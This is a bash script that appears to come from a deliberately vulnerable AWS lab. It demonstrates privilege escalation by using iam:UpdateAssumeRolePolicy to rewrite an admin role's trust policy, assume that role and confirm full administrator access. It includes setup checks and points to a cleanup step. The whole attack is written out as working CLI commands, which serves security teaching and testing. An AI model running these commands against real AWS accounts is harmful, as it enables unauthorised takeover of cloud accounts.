#!/bin/bash

# Demo script for iam-updateassumerolepolicy privilege escalation
# This scenario demonstrates how a user with iam:UpdateAssumeRolePolicy permission
# can modify an admin role's trust policy to grant themselves access.

set -e

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-iam-012-to-admin-starting-user"
TARGET_ROLE="pl-prod-iam-012-to-admin-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM UpdateAssumeRolePolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_012_iam_updateassumerolepolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
TARGET_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Check current trust policy of target role
echo -e "${YELLOW}Step 4: Examining target admin role${NC}"
echo "Target role: $TARGET_ROLE_NAME"
echo "Target role ARN: $TARGET_ROLE_ARN"

echo -e "\nRetrieving current trust policy..."
CURRENT_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json)
echo "Current trust policy:"
echo "$CURRENT_TRUST_POLICY" | jq '.'

# Save original trust policy for cleanup
echo "$CURRENT_TRUST_POLICY" > /tmp/original_trust_policy_iam_012.json
echo -e "${GREEN}✓ Saved original trust policy${NC}\n"

# Step 5: Verify we cannot assume the target role yet
echo -e "${YELLOW}Step 5: Verifying we cannot assume target role yet${NC}"
echo "Attempting to assume target role (should fail)..."
if aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name test-session &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly able to assume target role already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot assume target role (as expected)${NC}"
fi
echo ""

# Step 6: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 6: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# Step 7: Update the trust policy to allow our user to assume it
echo -e "${YELLOW}Step 7: Exploiting iam:UpdateAssumeRolePolicy permission${NC}"
echo "Modifying target role trust policy to allow $STARTING_USER to assume it..."

# Get our user ARN
USER_ARN=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Our user ARN: $USER_ARN"

NEW_TRUST_POLICY=$(cat <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "$USER_ARN"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
)

echo -e "\nNew trust policy to be applied:"
echo "$NEW_TRUST_POLICY" | jq '.'

# Update the trust policy
aws iam update-assume-role-policy \
    --role-name $TARGET_ROLE_NAME \
    --policy-document "$NEW_TRUST_POLICY"

echo -e "${GREEN}✓ Successfully updated trust policy!${NC}\n"

# Wait for IAM propagation (15 seconds required for IAM changes)
echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM changes propagated${NC}\n"

# Step 8: Verify the trust policy was updated
echo -e "${YELLOW}Step 8: Verifying trust policy modification${NC}"
UPDATED_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json)
echo "Updated trust policy:"
echo "$UPDATED_TRUST_POLICY" | jq '.'
echo -e "${GREEN}✓ Trust policy successfully modified${NC}\n"

# Step 9: Assume the target admin role
echo -e "${YELLOW}Step 9: Assuming the target admin role${NC}"
echo "Role ARN: $TARGET_ROLE_ARN"

TARGET_CREDENTIALS=$(aws sts assume-role \
    --role-arn "$TARGET_ROLE_ARN" \
    --role-session-name admin-escalation-session \
    --output json)

# Switch to target role credentials
export AWS_ACCESS_KEY_ID=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify target role assumption
TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $TARGET_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed target admin role!${NC}\n"

# Step 10: Verify administrator access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER"
echo "2. Used iam:UpdateAssumeRolePolicy to modify $TARGET_ROLE trust policy"
echo "3. Added our user as a trusted principal"
echo "4. Assumed the $TARGET_ROLE (which has AdministratorAccess)"
echo "5. Achieved: Full administrative access to the AWS account"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (iam:UpdateAssumeRolePolicy) → Modify Trust → (sts:AssumeRole) → $TARGET_ROLE → Administrator"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified trust policy on role: $TARGET_ROLE_NAME"
echo "- Active assumed role session: admin-escalation-session"

echo -e "\n${RED}⚠ Warning: The target role's trust policy has been modified${NC}"
echo -e "${YELLOW}To clean up and restore the original trust policy:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
